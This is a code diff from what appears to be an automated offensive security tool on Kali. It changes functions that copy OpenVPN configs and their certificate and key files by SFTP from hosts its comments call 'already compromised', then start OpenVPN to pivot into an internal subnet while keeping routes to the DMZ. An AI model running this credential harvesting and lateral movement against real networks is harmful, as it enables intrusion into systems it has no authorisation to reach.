@@ -634,32 +634,41 @@ def _download_ovpn_files(
         info(f"Downloading {ovpn_path} from {host}...")
         sftp.get(ovpn_path, str(local_ovpn))
 
-        # Parse the .ovpn for referenced cert/key/ca files and download them too
+        # Parse the .ovpn for referenced cert/key/ca files and download them.
+        # Skip any directive that uses inline blocks (<ca>...</ca> etc.)
         ovpn_content = local_ovpn.read_text(errors="replace")
         remote_dir = str(Path(ovpn_path).parent)
+        modified = False
 
         for directive in ("ca", "cert", "key", "tls-auth", "tls-crypt"):
+            # If the config has an inline block for this directive, skip it
+            if re.search(rf"<{directive}>", ovpn_content):
+                info(f"  {directive}: inline block detected — no download needed")
+                continue
             pattern = re.compile(rf"^\s*{directive}\s+(\S+)", re.MULTILINE)
             m = pattern.search(ovpn_content)
-            if m:
-                ref_file = m.group(1)
-                # If relative path, resolve against the .ovpn's directory
-                if not ref_file.startswith("/"):
-                    ref_file = f"{remote_dir}/{ref_file}"
-                local_ref = local_dir / Path(ref_file).name
-                try:
-                    info(f"Downloading referenced file: {ref_file}")
-                    sftp.get(ref_file, str(local_ref))
-                    # Rewrite the .ovpn to point at the local copy
-                    ovpn_content = ovpn_content.replace(
-                        m.group(0).strip(),
-                        f"{directive} {local_ref}",
-                    )
-                except Exception as exc:
-                    warn(f"Could not download {ref_file}: {exc}")
+            if not m:
+                continue
+            ref_file = m.group(1)
+            # If relative path, resolve against the .ovpn's directory
+            if not ref_file.startswith("/"):
+                ref_file = f"{remote_dir}/{ref_file}"
+            local_ref = local_dir / Path(ref_file).name
+            try:
+                info(f"Downloading referenced file: {ref_file}")
+                sftp.get(ref_file, str(local_ref))
+                # Rewrite the .ovpn to point at the local copy
+                ovpn_content = ovpn_content.replace(
+                    m.group(0).strip(),
+                    f"{directive} {local_ref}",
+                )
+                modified = True
+            except Exception as exc:
+                warn(f"Could not download {ref_file}: {exc}")
 
-        # Write updated .ovpn with local paths
-        local_ovpn.write_text(ovpn_content)
+        # Only rewrite if we changed external paths to local ones
+        if modified:
+            local_ovpn.write_text(ovpn_content)
 
         sftp.close()
         client.close()
@@ -685,11 +694,23 @@ def _connect_vpn(ovpn_path: Path, timeout: int = 30) -> bool:
     info(f"Starting OpenVPN with {ovpn_path}...")
     tlog("pivot", f"Connecting OpenVPN: {ovpn_path}", "attempt")
 
+    # Check if the config or server pushes a default gateway redirect.
+    # If so, use --pull-filter to ignore it — we only want the subnet
+    # routes, not to replace Kali's default gateway (which would break
+    # connectivity to DMZ hosts we already compromised).
+    ovpn_text = ovpn_path.read_text(errors="replace")
+    cmd = ["openvpn", "--config", str(ovpn_path)]
+    if "redirect-gateway" in ovpn_text:
+        info("Config contains redirect-gateway — adding --pull-filter to ignore it")
+        cmd += ["--pull-filter", "ignore", "redirect-gateway"]
+    # Always ignore pushed DNS to avoid breaking Kali's resolver
+    cmd += ["--pull-filter", "ignore", "dhcp-option"]
+
     log_path = STATE_DIR / "vpn_pivot" / "openvpn.log"
     try:
         _VPN_PROCESS = subprocess.Popen(
-            ["openvpn", "--config", str(ovpn_path), "--daemon",
-             "--log", str(log_path), "--writepid", str(STATE_DIR / "vpn_pivot" / "openvpn.pid")],
+            cmd + ["--daemon", "--log", str(log_path),
+                   "--writepid", str(STATE_DIR / "vpn_pivot" / "openvpn.pid")],
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL,
         )
